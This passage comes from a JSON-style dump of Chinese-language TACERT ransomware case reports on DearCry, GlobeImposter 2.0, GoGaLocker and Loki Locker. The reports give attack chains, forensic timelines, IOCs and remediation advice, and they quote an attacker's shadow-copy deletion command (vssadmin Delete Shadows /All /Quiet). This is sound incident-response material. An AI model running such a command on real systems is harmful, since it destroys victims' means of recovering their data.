-svcv2\\release\\encryptfile.exe.pdb」,也得知該程式最後編譯的時間為2021/3/9 16:08。 10. 將一個被加密的檔案與readme.txt 送至ID Ransomware 勒索軟體識別網站 (https://id-ransomware.malwarehunterteam.com) 檢測,檢測結果為DearCry 勒 索軟體。此勒索軟體目前尚未有解密器可將被加密的檔案解密,建議可將被 加密的檔案備份,以待未來有解密器產生時進行解密。 11. 2b9838da7.exe 經virus",
        "Page_Num": "5,6"
    },
    "322": {
        "File_Name": "個案分析-勒索病毒DearCry分析報告.pdf",
        "content": "total 檢測其惡意比例為53/69,多數防毒軟體以DearCry 或DoejoCrypt 命名它。  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 三、攻擊行為示意圖  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 1. 駭客以443port 發送惡意的HTTP 請求。 2. 利用CVE-2021-26855 漏洞進行伺服器請求偽造SSRF 攻擊。 3. 通過Exchange Server 進行身份驗證。 4. 利用CVE-2021-26858 與CVE-2021-27065 漏洞,進行在身份驗證後構造惡意 請求,並在系統上寫入任意檔案等攻擊行為。 5. 利用CVE-2021-26857 漏洞,通過構造惡意請求,觸發反序列化漏洞,在伺 服器上執行惡意代碼。 6. 撰寫可將檔案寫入伺服器上任何路徑的惡意檔案。 7. 進行提權來執行任何命令。 8. 植入惡意的Web Shell 腳本程式。 9. 執行Web Shell 腳本程式將勒索軟體DearCry 上傳至Exchange Server。 10. 執行勒索軟體DearCry 來加密Exchange Server 內的檔案。 11. 勒索軟體DearCry 加密檔案完成後產出readme.txt 的勒索通知信。 四、 總結與建議  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 1. 由於ProxyLogon 漏洞被揭露,導致利用漏洞來攻擊的事件頻繁,其中利 用勒索病毒DearCry 來進行攻擊的事件也不少。從分析DearCry 樣本觀察 到DearCry 具有下列特徵: (1) 執行後DearCry 勒索軟體不會在原地消失,不是無檔案式的勒索病毒。 (2) 它只會對特定檔案類型的檔案進行加密,而被加密後的檔案之副檔名 皆為CRYPT。 (3) 每一個被加密檔案的Hex 內容開頭第一句都是「DEARCRY!」。 (4) 在加密作業完成後,在主機桌面與其他除C:外",
        "Page_Num": "6,7,8,9"
    },
    "323": {
        "File_Name": "個案分析-勒索病毒DearCry分析報告.pdf",
        "content": "的磁碟機第一層會出現 勒索通知信readme.txt。 (5) 在程式原始碼中,發現該勒索軟體的RSA 公開金鑰內容。 (6) 分析程式原始碼會發現在debug 資訊內存在一個PDB 路徑資訊。 (7) 該勒索軟體的惡意比例高達53/69。 (8) 多數防毒軟體公司以DearCry 或DoejoCrypt 命名它。 (9) 該勒索軟體目前尚未有解密器產生。 2. 在預防DearCry 勒索軟體攻擊Exchange Server 方面,提供下列建議措施 給大家參考。 (1) 修補Exchange Server 的漏洞。 (2) 定期備份使用者Mail 信箱內的信件與信件聯絡人資訊。 (3) 定期更新防毒軟體的病毒碼與更新Exchange Server 的系統。 3. 在Exchange Server 的資安防護方面,除了修補漏洞外,有下列建議措施 提供參考。 (1)檢視Exchange Server 是否有駭入跡象或存在web shell。 (2)安裝微軟一鍵式工具EOMT,進行完整的AV 掃描。 (3)檢查使用者及使用者群組是否有可疑的新增帳號,可透過查找事件檢 視器紀錄內的Event ID:4720,來確認是否有建立新的帳號。(「Event ID:4720」表示「已建立使用者帳戶」)  9 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (4)變更所有使用者帳號和系統管理員帳號之密碼。 (5)檢查系統RDP、防火牆、WMI 訂閱以及Windows 遠程管理(WinRM) 是否遭到變更。 (6)檢查系統是否有新增的服務、排程或啟動物件,或是新安裝的影子IT 工具(如非微軟的RDP 及遠端存取工具)。 (7)檢查Exchange 電子郵件轉發設定(ForwardingAddress 和 ForwardingSMTPAddress 屬性)、郵件收件規則以及Exchange 傳輸規則。 (8)檢視事件檢視器之紀錄,查找是否有Event ID 為1102。若有,表示駭 客曾經清除系統安全性審核紀錄,來企圖隱藏蹤跡。(「Event ID:1102 」 表示「已清除審核記錄」) 4. DearCry IOC: 以下是DearCry 樣本相關的檔案雜湊碼。 No SHA",
        "Page_Num": "9,10"
    },
    "324": {
        "File_Name": "個案分析-勒索病毒DearCry分析報告.pdf",
        "content": "256 1 2b9838da7edb0decd32b086e47a31e8f5733b5981ad8247a2f9508e232589bff 2 e044d9f2d0f1260c3f4a543a1e67f33fcac265be114a1b135fd575b860d2b8c6 3 feb3e6d30ba573ba23f3bd1291ca173b7879706d1fe039c34d53a4fdcdf33ede 4 fdec933ca1dd1387d970eeea32ce5d1f87940dfb6a403ab5fc149813726cbd65 5 10bce0ff6597f347c3cca8363b7c81a8bff52d2ff81245cd1e66a6e11aeb25da 6 6834d9f4a9e1888d82c70b72f30ced8aa68c009b55d03efffc94c466fbb3d047 7 17c5161451b5edd31d903fb020afc7f9f2f130fea8fbd9248e069dde7f80efa3 五、 參考資料 1. 微軟:修補完Exchange Server 漏洞還不能掉以輕心 https://www.ithome.com.tw/news/143514 2. Analyzing attacks taking advantage of the Exchange Server vulnerabilities https://www.microsoft.com/security/blog/2021/03/25/analyzing-attacks-taking-ad  10 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team vantage-of-the-exchange-server-vulnerabilities/ 3. Guidance for responders: Investigating and remediating on-premises Exchange Server vulnerabilities https://msrc-blog.microsoft.com/2021/03/16/guidance-for-responders-investigatin g-and-remediating-on-premises-exchange-server-vulnerabilities/ 4. 微軟一鍵式工具EOMT: https://msrc-blog.microsoft.com/2021/03/15/one",
        "Page_Num": "10,11"
    },
    "325": {
        "File_Name": "個案分析-勒索病毒DearCry分析報告.pdf",
        "content": "-click-microsoft-exchange-on-pr emises-mitigation-tool-march-2021/ 5. DearCry ransomware attacks Microsoft Exchange with ProxyLogon exploits https://www.bleepingcomputer.com/news/security/dearcry-ransomware-attacks-m icrosoft-exchange-with-proxylogon-exploits/ ",
        "Page_Num": "11"
    },
    "326": {
        "File_Name": "個案分析-勒索病毒GlobeImposter2.0攻擊事件分析報告_10907.pdf",
        "content": "勒索病毒GlobeImposter 2.0 攻擊事件分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 2020 年07 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 一、 事件簡介 1. 2020 年3 月底某學校有多台主機感染勒索病毒,為了瞭解該病毒對於受害主 機的感染途徑與所造成的危害程度,對該校所提供的一台受害虛擬主機進行 鑑識作業。 二、事件檢測 1. 首先,從系統資訊確認主機系統為Windows Server 2008R2 Standard,但處理 器與記憶體資訊無法得知。 在系統內容中發現該主機設定允許來自執行任何版本之遠端桌面的電腦進行 連線。  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 2. 該主機有開啟防火牆設定,並且各使用者帳戶皆有設定密碼保護,但該主機 管理者有使用同一組帳號與密碼管理多台主機的現象。 3. 從帳戶Meixxx 的內容設定發現主機的遠端控制功能是開啟的,並且操控主 機的權限層級非「檢視使用者工作階段」,而是設定為「與工作階段互動」。 由此設定得知若駭客能從遠端連線入侵主機,則可在主機上執行惡意程式的 機率很高。 4. 查看主機內檔案狀態發現主機內有被加密的檔案其副檔名皆為 HAPPY4CHOOSE,而且在被加密的資料夾內都會有一個Decryption INFO.html 檔。  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 5. 經檢視Decryption INFO.html 內容,發現其為一個勒索通知信。信中提供受 害者ID,並告訴受害者需有解密器才可以將檔案解密。駭客也告訴受害者可 以提供1 個測試的影像檔或文字檔,附上受害者ID 寄至happychoose@cock.li 或happychoose2@cock.li 信箱。駭客會將該檔案解密後連同解密所有檔案的 贖金資訊回傳給受害者。待受害者給付贖金後,駭客會將解密器提供給受害 者。 ",
        "Page_Num": "1,2,3,4"
    },
    "327": {
        "File_Name": "個案分析-勒索病毒GlobeImposter2.0攻擊事件分析報告_10907.pdf",
        "content": "4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 6. 將一個被加密的檔案與勒索通知信Decryption INFO.html 送ID Ransomware(https://id-ransomware.malwarehunterteam.com) 勒索病毒辦別網 站,經檢測判定為GlobeImposter 2.0 勒索病毒。  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 7. 從檔案被加密的時間點得知檔案被加密的時間介於2020/03/28 05:58~06:28, 推測駭客在2020/03/28 05:58 之前就有駭入主機的行為。 8. 從主機的操作紀錄發現,在檔案將被加密前(2020/03/28 05:58:22)有使用滑鼠 點開C:\\Users\\Public\\Videos 資料夾的紀錄,推測此行為可能為駭客所為。 9. 在系統日誌紀錄中發現主機網站test.sxxx.com.tw 所建立的temp 資料夾內, 有一個test.sxxx.com.tw 資料夾發生讀取網站config 錯誤的紀錄,推測可能是 因為這些網站資料已被加密,故造成讀取錯誤。  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 10. C:\\inetpub\\temp\\apppools\\test.sxxx.com.tw 內發現上面所提到的檔案 test.sxxx.com.tw.config,它在2020/01/16 上午04:24 被Administrators 群組建 立,從建立檔案的日期判斷此行為應該非管理者所為。 11. 在C:\\inetpub\\wwwroot 資料夾內發現2019/04/02 18:51 與18:59 由 Administrators 群組所建立的兩個網站資料夾「test.sxxx.com.tw」與「18XX 山」,管理者告知「 18XX 山」資料夾為其所建立,而「test.sxxx.com.tw 」 非 其所建立,推測「test.sxxx.com.tw」資料夾可能是駭客駭入所建立,因此該 主機在一年前可能已經有被駭客駭入的現象。 12. 在系統日誌中發現2019/04/02 18",
        "Page_Num": "5,6,7"
    },
    "328": {
        "File_Name": "個案分析-勒索病毒GlobeImposter2.0攻擊事件分析報告_10907.pdf",
        "content": ":50~19:26 帳戶Meixxx 從IP:61.X.23.118 (中 華電信)以遠端桌面方式登入主機。另該帳戶在2019/04/02 15:50~18:37 期間 也從IP:61.X.23.118 登入主機。 (註:下圖時間為UTC 時間,需加8 小時才是台灣時間)  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 13. 檢視Meixxx 的網頁下載紀錄,發現Meixxx 在2019/04/02 16:15 至18:59 期間 曾經下載一些執行檔(含SSMS-Setup-CHT.exe),並在2019/04/02 18:59 從 http://customer.sxxx.com.tw/下載18.zip。 (註:下圖時間為UTC 時間,需加8 小時才是台灣時間) 14. 從主機的操作紀錄發現主機在2019/04/02 16:49-17:28 期間安裝軟體(含SQL 軟體與SSMS-Setup-CHT.exe)。又Meixxx 在2019-04-02 16:15-17:09 期間曾下 載一些執行檔(含SQL 安裝檔與SSMS-Setup-CHT.exe),故推測此軟體安裝行 為為Meixxx 所為。  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 15. 從Meixxx 的網頁瀏覽紀錄,發現Meixxx 在2019/04/02 18:54 開始陸續連線 http://test.sxxx.com.tw,疑似在測試test.sxxx.com.tw 網站。  9 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 16. 在C:\\inetpub\\temp\\...\\WWWROOT 資料夾內發現由「test.sxxx.com.tw」在 2019/04/08 14:14 所建立的「18XX 山」資料夾,推測該資料夾是解壓縮後產 生「18XX 山」網站的資料夾。由此可以得知駭客透過「test.sxxx.com.tw」網 站取得「18XX 山」的網站資料。 17. 透過Virustotal 檢視網址test.sxxx.com.tw 的惡意程度,發現",
        "Page_Num": "7,8,9,10"
    },
    "329": {
        "File_Name": "個案分析-勒索病毒GlobeImposter2.0攻擊事件分析報告_10907.pdf",
        "content": "該網址對應IP 為 140.X.X.233(為本主機的IP),其惡意比例為0/79,而且該網址曾有一個惡意 程式提供下載。查看該惡意程式的惡意比例為1/58,僅一家防毒軟體認為其 為惡意程式。在Virustotal 的資安社群中討論其為透過USB 傳播的病毒。由 這些資訊推測本主機的網站可能為駭客駭入主機所架設,而非管理者所建立。  10 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 18. 由主機的系統日誌發現在2020/03/28 06:28 主機檔案被加密的過程中,駭客以 帳戶Administrator 登入,並執行「vssadmin.exe Delete Shadows /All /Quiet」 刪除影子副本的指令。 19. 檢視主機內事件檢視器的安全性紀錄得知在2020/03/28 11:31 之前的紀錄已 不存在,但是其他類別的紀錄仍存在,推測此紀錄可能是被駭客刪除。  11 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 20. 從主機的各帳戶登入紀錄發現,在2020/03/28 有6 筆帳戶Administrator 以遠 端桌面或網路方式登入主機的紀錄,其中以IP:10.10.14.218 在2020/03/28 5:55 登入主機的時間點最接近檔案開始被加密的時間5:58。 Logon Time User Name IP Logon Type 2020/03/28 2:47 Administrator 10.10.14.100 10(遠端桌面) 2020/03/28 5:55 Administrator 10.10.14.218 10(遠端桌面) 2020/03/28 19:48:50 Administrator 10.10.14.19 3(網路登入) 2020/03/28 19:48:56 Administrator 140.X.X.19 3(網路登入) 2020/03/28 20:04 Administrator 10.10.14.100 10(遠端桌面) 2020/03/28 22:51 Administrator 140.X.X.28 10(遠端桌面) (註:下圖時間為UTC 時間,需加8 小時才是台灣時間) 21. 檢視該主機對外所開啟的port狀態,發現該主機開啟駭客常會攻擊的3389port 與445port,也開啟FTP 所使用的21port。此行為容易造成主機被駭客攻擊。  12 臺灣學術網路",
        "Page_Num": "10,11,12,13"
    },
    "330": {
        "File_Name": "個案分析-勒索病毒GlobeImposter2.0攻擊事件分析報告_10907.pdf",
        "content": "危機處理中心(TACERT) TANet Computer Emergency Response Team 三、事件攻擊行為示意圖 雖然受害主機在一年前就有駭客駭入足跡,但本事件的檢測目的主要是探討受害 主機如何感染GlobeImposter 2.0 勒索病毒的過程,故在此將針對此疑問進行說 明如下。 1. 駭客以暴力破解方式駭入主機。 2. 駭客從IP:10.10.14.218 以遠端桌面方式登入受害主機。(2020/03/28 05:55) 3. 駭客對受害主機內的檔案進行加密作業。(2020/03/28 05:58~06:28) 4. 在加密作業完成後執行刪除影子副本的指令。(2020/03/28 06:28) 四、總結與建議 1. 本事件為學校在2020/03/28 當日多台主機同時感染勒索病毒,從學校所提 供的檢測主機上發現當日有一個IP:10.10.14.218 以帳戶Administrator 登入  13 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 主機,之後該主機即有檔案被加密的現象發生。 2. 在受害主機上發現「test.sxxx.com.tw」與「18XX 山」網站資料夾在 2019/04/02 18:51 與18:59 被Administrators 群組所建立,而 「test.sxxx.com.tw」非管理者或使用者所建立。在同天18:54 被帳戶Meixxx 以網頁瀏覽方式陸續存取test.sxxx.com.tw 網站,疑似為駭客駭入主機後 所為,推測該主機在一年前已經被駭客駭入。 3. 該受害主機有開啟一些駭客常會攻擊的port (21、3389、445Port),其中 445port 為勒索病毒常用來散播病毒的管道。如無特殊需求,建議關閉 445port 的服務。 4. 該受害主機經檢測是感染GlobeImposter 2.0 勒索病毒。該病毒在執行後 通常會自己從所在的資料夾中消失,無法搜尋到它的存在之處。目前該病 毒沒有解密器,建議將已被加密的重要檔案備份,等待未來有解密器產生 時進行解密。 5. 在預防勒索病毒方面,",
        "Page_Num": "13,14"
    },
    "331": {
        "File_Name": "個案分析-勒索病毒GlobeImposter2.0攻擊事件分析報告_10907.pdf",
        "content": "有下列建議作法提供參考。 (1)定期進行作業系統、應用程式與防毒軟體病毒碼的更新。 (2)定期清查重要資料,並定期進行資料備份作業。 (3)檢視網路硬碟與共用資料夾之使用者存取權限,避免非必要的使用與 存取。 (4)定期檢視作業系統與應用程式更新紀錄,避免駭客利用作業系統或應 用程式的安全性漏洞進行入侵行為。 (5)當使用隨身碟傳輸資料時,應先檢查隨身碟是否感染病毒或惡意程式。 (6)如非必要盡量減少使用網路磁碟機來共享資料,以降低勒索病毒擴散 的風險。 (7)定期檢視主機port 開啟的狀況,如無需求可關閉勒索軟體常會使用來 散播病毒的445port,也盡量減少開啟遠端桌面連線會使用的3389port。 (8)平時應加強校內人員的教育訓練,提升使用者對勒索軟體的知識。讓  14 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 使用者平時即留意收發的電子郵件是否安全,並且注意郵件來源的正確 性。養成使用者不隨意開啟不明來源信件的附檔或連結的習慣,以防感 染惡意程式。 6. 當主機疑似感染勒索軟體時,有下列應對措施提供參考。 (1)發現當下應立即關閉主機並切斷網路,避免災情擴大。 (2)立即通知資訊人員或廠商協助搶救還沒被加密的檔案。 (3)對於已被加密的檔案,可保留一份備份,以待未來有解密器時可還原 檔案。 (4)建議重新安裝作業系統與應用程式,並確認已安裝至最新修補程式後, 再還原備份的資料。 (5)備份資料在還原至主機之前,應以防毒軟體檢查主機,確保沒有殘存 的惡意程式於主機內。 (6)待還原備份的資料至重新安裝的主機後,進行資料盤點與確認是否有 資料遺失的狀況。 ",
        "Page_Num": "14,15"
    },
    "332": {
        "File_Name": "個案分析-勒索病毒GoGaLocker攻擊事件分析報告_10809.pdf",
        "content": "勒索病毒GoGaLocker 攻擊 事件分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 2019 年9 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 一、 事件簡介 1. 知名資安公司賽門鐵克在2019年7月所發佈的「TARGETED RANSOMWARE: An ISTR Special Report」報告指出,GoGalocker 是2019 年1 月出現的一種新 的目標式勒索軟體威脅,而從2017 年1 月至2019 年5 月受目標式勒索軟體 家族攻擊影響的組織數量圖可以看到,GoGalocker 在2019 年2 月開始有攻 擊行為。 (資料來源:賽門鐵克TARGETED RANSOMWARE: An ISTR Special Report) 2. 自從2019 年初首次出現以來,GoGalocker 已經攻擊了各行業領域的組織, 包括電腦服務、會計和審計、諮詢、金融服務、電動工具、建築和施工、金 融服務、出版、印刷、金屬和倉儲等。這些目標組織中有23%位於美國,但 除此之外,斯堪的納維亞(Scandinavia)的受害者比例很高,包括芬蘭(23%), 挪威(15%)和瑞典(8%)。  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (資料來源:賽門鐵克TARGETED RANSOMWARE: An ISTR Special Report) 3. 為了解GoGaLocker 之攻擊行為與危害程度,本中心取得樣本後進行檢測。 二、事件檢測 1. 首先,使用一台有Windows 7 32 位元作業系統的虛擬主機,並且將 GoGaLocker 樣本65d5dd067.exe (MD5: 438ebec995ad8e05a0cea2e409bfd488) 放於該主機內。 2. 在執行前檢視65d5dd067.exe 的內容,發現該程式的數位簽章是由ALISA LTD 所簽署,推測此為駭客用合法的憑證對其勒索軟體進行數位簽章的隱藏手 法,藉此避免惡意程式被發現。  3 臺灣學術網路危機處理中心",
        "Page_Num": "1,2,3,4"
    },
    "333": {
        "File_Name": "個案分析-勒索病毒GoGaLocker攻擊事件分析報告_10809.pdf",
        "content": "(TACERT) TANet Computer Emergency Response Team 3. 65d5dd067.exe 經Virustotal 檢測,其惡意比例為59/68,而且有多家防毒軟體 公司以Lockergoga 命名它。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 4. 執行65d5dd067.exe 後,發現該程式在其所在之位置原地消失,但在C:\\使用 者\\Ruby\\AppData\\Local\\Temp 資料夾內會發現另一個與它相同的程式 tgytutrc[4 位亂數].exe(如tgytutrc1471.exe),而且在Temp 資料夾內也會產生一 個tgytutrc[4 位亂數].exe.cmd(如tgytutrc1471.exe.cmd)的Windows 命令指令 碼。 查看tgytutrc1471.exe.cmd 內容,發現3 行指令,第一行指令是timeout 3,之 後第二行與第三行指令是刪除tgytutrc1471.exe 與tgytutrc1471.exe.cmd。 5. 在執行65d5dd067.exe 後,主機陸續出現檔案被加密的狀態,而且被加密的 檔案皆會延伸出一個.locked 的副檔名。除了將檔案加密外,該程式也會將視 窗設定的背景顏色全部改為淺灰色,而在桌面左下角的工作列圖示也變成白 色。在加密後查看主機檔案被加密情形,發現除了C:\\windows 資料夾內的檔 案與txt 文字檔沒被加密外,主機內的檔案都被加密。  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 6. 65d5dd067.exe 對主機內檔案進行加密後,在主機公用桌面會出現一個 README_LOCKED.txt 的勒索通知信。 從該文字檔內容得知,加密是使用最強的軍事演算法RSA4096 與AES-256, 受害者可以寄2-3 個不同的檔案給駭客進行解密,並且建議受害者不要隨意 重新開機或關機、不要對已被加密的檔案更改檔案名稱",
        "Page_Num": "4,5,6"
    },
    "334": {
        "File_Name": "個案分析-勒索病毒GoGaLocker攻擊事件分析報告_10809.pdf",
        "content": "、不要移動已被加密 的檔案,因為這些行為可能導致檔案無法復原。最後駭客告訴受害者以比特 幣支付贖金,並且需寫信至DharmaParrack@protonmail.com 或 wyattpettigrew8922555@mail.com 來取得贖金金額的資訊。  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 7. 檢視背景程式運作情形,從Command 可以得知65d5dd067.exe 執行後會將自 己移動到C:\\Users\\Ruby\\AppData\\Local\\Temp 資料夾內,並且更名為 tgytutrc1471.exe,之後tgytutrc1471.exe(PID:1092)會呼叫logoff.exe、net.exe 與執行多次的tgytutrc1471.exe,其中logoff.exe 為工作階段登出公用程式, net.exe 會呼叫net1.exe 來更改具有系統管理者權限的使用者之密碼,推測更 改後的密碼為「HuHuHUHoHo283283@dJD」,而之後執行多次的 tgytutrc1471.exe 來開始加密主機內各檔案。 在加密檔案完成後會呼叫cipher.exe 來清理C 與D 兩磁碟區,以解除配置的空 間。之後會執行netsh.exe 將區域連線停用、停用介面Loopback Pseudo-Interface 1 與介面isatap。接著會執行tgytutrc1471.exe.cmd 的命令來暫停命令處理3 秒鐘, 之後執行logff.exe 來成功登出系統。  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 8. 檢視主機系統效能,發現CPU 使用率將近100%,而且有49%的使用率被 tgytutrc1471.exe 所使用,可見該程式在加密檔案的過程會佔用許多CPU 的資 源。 9. 在程式65d5dd067.exe 執行一段時間後,主機會自動進行使用者登出作業, 登出後發現使用者圖示變成空白,而且無法使用原來的密碼登入,同時在主 機上的其他",
        "Page_Num": "6,7,8"
    },
    "335": {
        "File_Name": "個案分析-勒索病毒GoGaLocker攻擊事件分析報告_10809.pdf",
        "content": "使用者也出現無法使用原密碼登入的情形。從背景程式net.exe 的 運作,猜測密碼可能為「HuHuHUHoHo283283@dJD」,以此密碼嘗試登入, 結果發現只有擁有系統管理者權限的使用者可用此密碼成功登入系統,一般 使用者會出現無法載入使用者設定檔的訊息。  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 查看Net.exe 的command 內容,發現該程式更改Administrator、Ming、Ruby 等三個擁有系統管理者權限的使用者之密碼,而一般使用者Maya 雖然密碼 沒被更改,但是因使用者設定檔無法載入,故無法登入,推測可能使用者設 定檔已遺失,而以帳戶Ruby 登入系統,發現在C:\\使用者資料夾內找不到使 用者Maya 所屬資料夾。 在以「帳戶Ruby、密碼:HuHuHUHoHo283283@dJD」成功登入系統後,會發 現該主機的網卡是停用狀態,無法連上網路,需重新啟用網卡後才可上網。  9 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 10. 查看65d5dd067.exe 的程式原始碼,發現該程式會特別針對下列副檔名的檔 案進行加密: 「.link、.doc、.doc、.docx、.docb、.dotx、.dotb、.wkb、.xml、.xls、.xlsx、. xlt、.xltx、.xlsb、.xlw、.ppt、.pps、.pot、.ppsx、.pptx、.posx、.potx、.sldx 、.pdf、.db、.sql、.cs、.ts、.js、.py」  10 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 三、事件攻擊行為示意圖 1.駭客利用垃圾郵件附件或其他方式散播Gogalocker 病毒。 2.使用者在受害主機上執行gogalocker 病毒程式。 3.gogalocker 程式移動自己到temp 資料夾,並且更名為tgytut",
        "Page_Num": "8,9,10,11"
    },
    "336": {
        "File_Name": "個案分析-勒索病毒GoGaLocker攻擊事件分析報告_10809.pdf",
        "content": "rc1471.exe。 4.tgytutrc1471.exe 呼叫logoff.exe。 5.tgytutrc1471.exe 呼叫net.exe 來更改有系統管理者權限之使用者的密碼。 6.執行多次tgytutrc1471.exe 來加密受害主機內的檔案。 7.呼叫cipher.exe 清理磁區與解除配置的空間。 8.呼叫netsh.exe 停用區域網路與兩個介面,使主機無法對外連網。 9.執行tgytutrc1471.exe.cmd 來暫停命令處理3 秒鐘。 10.執行logoff.exe 成功登出系統。  11 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 四、總結與建議 1. 勒索病毒Gogalocker 在執行後會在原地消失,並且在使用者的隱藏資料 夾AppData\\local\\Temp 內出現,一般使用者無法輕易地發現它的存在,此 手法類似無檔案式的勒索病毒。 2. Gogalocker 病毒使用ALISA LTD 所簽署的數位簽章來偽裝自己是一個合 法的程式,藉此規避防毒軟體的偵測。 3. 除了C:\\windows 內的檔案與txt 文字檔外,該病毒會將主機內的檔案都加 密,並且將主機的視窗背景顏色變更為淺灰色。 4. 它與以往的勒索病毒不同,它會更改具有系統管理者權限的使用者之密 碼,而且該病毒執行一段時間後會登出系統,導致受害者無法登入系統。 5. Gogalocker 病毒在加密作業完成、登出系統之前,會停用主機的網卡,關 閉主機的區域網路連線功能,讓主機完全無法連網。 6. 受害者因為密碼被更改而無法登入系統,將導致無法查看勒索通知信的內 容,推測使用者與駭客取得聯繫的機會很低,也可得知此病毒對受害主機 的破壞程度很大,推測駭客的主要目的可能不是勒索金錢。 7. 針對Gogalocker 病毒的攻擊,有下列預防措施提供使用者參考。 (1) 不隨意下載或執行不明來源的程式。 (2) 中斷非必要的網路磁碟機連線。如必要連線,可設定檔案為Read-on",
        "Page_Num": "11,12"
    },
    "337": {
        "File_Name": "個案分析-勒索病毒GoGaLocker攻擊事件分析報告_10809.pdf",
        "content": "ly 唯讀。 (3) 停用AutoPlay 功能,以防止自動執行可執行的檔案。 (4) 關閉並刪除主機內不必要的服務,以減少可能被攻擊的路徑。 (5) 設定電子郵件伺服器來阻止或刪除包含常用於傳播病毒的附件檔案的 電子郵件,例如.vbs,.bat,.exe,.pif 和.scr 等附件檔案。 (6) 定期進行系統更新與病毒碼更新,並且定期進行主機的掃毒作業。 (7) 定期備份主機內的資料。  12 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 五、相關資料 1. 賽門鐵克「TARGETED RANSOMWARE: An ISTR Special Report」報告 (2019 年7 月) http://images.mktgassets.symantec.com/Web/Symantec/%7Bb464dc43-2ae0-4912-87 58-b153d8f278e7%7D_Targeted_Ransomware_2019July.pdf 2. Targeted Ransomware: Proliferating Menace Threatens Organizations https://www.symantec.com/blogs/threat-intelligence/targeted-ransomware-threat ",
        "Page_Num": "12,13"
    },
    "338": {
        "File_Name": "個案分析-勒索病毒Loki Locker分析報告.pdf",
        "content": "TLP:WHITE 勒索病毒Loki Locker 分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 2021 年12 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 一、 事件簡介 1. 在2021/11 初某單位所管理轄下學校之共構網站資料庫系統主機,被駭 客透過該單位所新建測試主機入侵後感染勒索病毒,造成轄下185 所 國中小學網站無法瀏覽。 2. TACERT 協助該單位判別勒索病毒的種類,而由該單位所提供之資料判 定感染Loki Locker 之變種病毒。被加密過檔案之檔名會被更改為下列 結構:[聯絡信箱][SYSTEM ID]原檔案名稱.Loki。 3. 該病毒執行後會產生Cpriv.Loki 與Restore-My-Files.txt (Ransom Note) 。 4. 為進一步了解該勒索病毒的特徵與其攻擊行為,TACERT 對該病毒樣本 進行分析。 二、事件檢測 1. 在Windows 7 32 位元的系統上執行病毒樣本15d7342.exe (MD:8aea251877cb4f5ee6cf357831f8620c)。  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (1) 執行後C、D 磁碟機名稱會被更名為「Locked by Loki」,網路磁碟 機不受影響。 (2) 產生info.hta 與Restore-My-Files.txt 於病毒樣本所在資料夾中。 (3) Restore-My-Files.txt 告訴受害者所有檔案已被加密,若要解密需24 小時內寫信至聯絡信箱,否則檔案會在到期時間後遺失。也告訴受 害者SYSTEM ID 與不要刪除Cpriv.Loki,以免檔案遺失。 2. 在加密作業完成後會執行5 個info.hta 腳本,這些info.hta 為Ransom note(勒索通知信)。它提供兩個聯絡信箱、受害主機ID 與繳款期限等資 訊,也告知受害者需48 小時內聯絡或付款,而且1 個月後檔案會遺失。 ",
        "Page_Num": "1,2,3"
    },
    "339": {
        "File_Name": "個案分析-勒索病毒Loki Locker分析報告.pdf",
        "content": "3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 3. 在桌面上會看到Loki locker 的紅字文,內容與info.hta 相似。它告訴受 害者在每個被加密的資料夾中都有Restore-My-Files.txt 提供參考。 4. 檢視對外網路連線情形,發現會連線荷蘭IP:91.223.82.6:80。從側錄封 包上得知此行為類似連線報到,並無傳送任何惡意程式或檔案。 5. 查看Cpriv.Loki 內容為一大段亂碼,該檔案會在每次病毒執行後產生新 的亂碼內容。 (1) 檢測主機首次執行病毒,Cpriv.Loki 內容如下圖。 (2) 檢測主機重新開機後,Cpriv.Loki 內容如下圖。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 6. 檢視15d7342.exe 執行後呼叫程式的情形,發現可以分為三個部分。 15d7342.exe 執行後: (1) 呼叫cmd.exe 執行schtasks.exe 來建立登入自動執行之新排程Loki , 該排程使用本機系統帳戶的最高權限執行winlogon.exe。 winlogon.exe 位於使用者帳戶的AppData\\Roaming 內,被視為作業系  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 統檔案而隱藏。 (2) 呼叫csc.exe 執行cvtres.exe 來修復因Compiler 發生錯誤、無法執行程 式所造成的執行階段錯誤。 (3) 再次呼叫15d7342.exe 來執行下列程式 (3.1) 呼叫csc.exe 來執行cvtres.exe。 因Compiler 